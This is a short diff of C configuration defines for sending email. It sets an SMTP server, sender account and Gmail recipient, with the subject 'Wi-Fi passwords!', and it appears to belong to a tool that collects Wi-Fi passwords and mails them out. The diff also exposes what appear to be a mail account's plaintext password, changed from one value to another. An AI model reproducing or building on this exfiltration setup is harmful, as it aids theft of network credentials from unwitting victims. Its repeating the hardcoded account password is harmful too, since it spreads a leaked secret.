@@ -12,7 +12,7 @@
 #define SMTP_SERVER "smtp.seznam.cz"
 #define SMTP_PORT 587
 #define SMTP_USER "info@infopeklo.cz"
-#define SMTP_PASS "Polik"
+#define SMTP_PASS "Polik789"
 #define SMTP_TO "alfikeita@gmail.com"
 #define SMTP_SUBJECT "Wi-Fi passwords!"
 #define SMTP_BODY "Here are the Wi-Fi passwords:\n"
